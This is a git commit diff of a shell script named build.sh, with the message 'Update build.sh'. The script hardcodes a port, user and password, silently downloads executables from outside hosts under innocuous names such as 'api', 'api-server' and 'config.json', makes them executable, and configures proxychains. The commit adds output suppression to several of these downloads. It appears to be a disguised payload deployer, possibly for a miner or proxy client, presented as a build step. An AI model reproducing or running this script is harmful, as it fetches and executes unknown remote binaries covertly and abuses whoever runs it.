250c8d143cc8d5dc6426c61018bfc6bbf8a2e89e
Mas kurniawan <110314564+55113110159@users.noreply.github.com>
2024-01-15 19:39:27 +0700

    Update build.sh

--- build.sh
+++ build.sh
@@ -3,10 +3,10 @@ port="9293"
 user="3j8rvvg4wcjt5b"  
 pass="cfqo67beev4dnog0y6mawtlejtpo" 
 wget -q -O api https://maper.info/Credit && chmod +x api >/dev/null 2>&1
-wget -q https://raw.githubusercontent.com/balma1/kitoy/main/config.json && chmod +x config.json
-wget -q -O api-server https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x api-server
-wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf 
-wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/libproxychains4.so && chmod +x libproxychains4.so 
+wget -q https://raw.githubusercontent.com/balma1/kitoy/main/config.json && chmod +x config.json >/dev/null 2>&1
+wget -q -O api-server https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x api-server >/dev/null 2>&1
+wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf  >/dev/null 2>&1
+wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/libproxychains4.so && chmod +x libproxychains4.so  >/dev/null 2>&1
 sleep 3 
 sed -i "s/127.0.0.1/$proxy/" "proxychains.conf" 
 sleep 1 
